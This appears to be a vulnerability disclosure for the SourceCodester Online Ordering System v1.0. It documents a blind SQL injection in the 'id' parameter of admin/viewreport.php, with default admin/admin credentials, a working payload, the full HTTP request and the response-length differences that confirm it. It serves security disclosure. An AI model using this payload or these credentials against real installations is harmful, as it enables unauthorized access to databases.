# Online Ordering System v1.0 by oretnom23 has SQL injection

Author： k0xx

The password for the backend login account is: admin/admin

vendors: https://www.sourcecodester.com/php/5125/online-ordering-system-using-phpmysql.html

Vulnerability File: /onlineordering/admin/viewreport.php

Vulnerability location: /onlineordering/admin/viewreport.php?id=,id

[+] Payload: /onlineordering/admin/viewreport.php?id=TKE-KMS%27%20and%20length(database())%20=12--+ // Leak place ---> id

Current database name: shoppingcart,length is 12

```sql
GET /onlineordering/admin/viewreport.php?id=TKE-KMS%27%20and%20length(database())%20=12--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=v112m4jpgqqtdo86av7lvbjv3l
Connection: close
```

When length (database ()) = 11, Content-Length: 1025

![image](https://user-images.githubusercontent.com/54017627/167338702-5dcbf0c8-26bd-4646-b479-383e607fb943.png)

![image](https://user-images.githubusercontent.com/54017627/167338754-6c3d0889-cde2-46f8-868f-86b4cbee95dc.png)

When length (database ()) = 12, Content-Length: 1486

![image](https://user-images.githubusercontent.com/54017627/167338680-454a7d80-ccb4-46f2-9770-de2f95fa2ddf.png)

![image](https://user-images.githubusercontent.com/54017627/167338719-c1465ab1-78b8-4434-873d-ea364e7ceb34.png)
